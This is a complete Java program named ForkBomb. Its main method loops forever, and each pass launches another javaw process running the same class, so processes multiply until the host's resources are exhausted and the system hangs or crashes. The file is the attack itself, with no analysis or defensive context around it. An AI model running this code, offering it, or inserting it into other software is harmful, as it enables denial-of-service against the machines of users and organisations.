public class ForkBomb
{
  public static void main(String[] args)
  {
    while(true)
    {
      try
      {
        Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
      }
      catch (java.io.IOException e)
      {
        e.printStackTrace();
        // Stop on error to avoid a tight-error loop which could spawn excessive processes
        break;
      }
    }
  }
}
